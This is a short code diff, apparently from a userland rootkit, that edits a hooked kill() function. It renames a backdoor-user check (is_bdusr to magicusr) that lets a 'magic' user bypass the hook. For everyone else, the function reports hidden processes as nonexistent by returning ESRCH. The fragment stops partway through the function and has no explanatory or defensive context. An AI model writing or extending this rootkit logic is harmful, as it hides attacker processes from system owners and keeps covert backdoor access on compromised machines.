@@ -1,5 +1,5 @@
 int kill(pid_t pid, int sig){
-    if(is_bdusr()) goto o_kill;
+    if(magicusr()) goto o_kill;
 
     if(hidden_proc(pid)){
         errno = ESRCH;
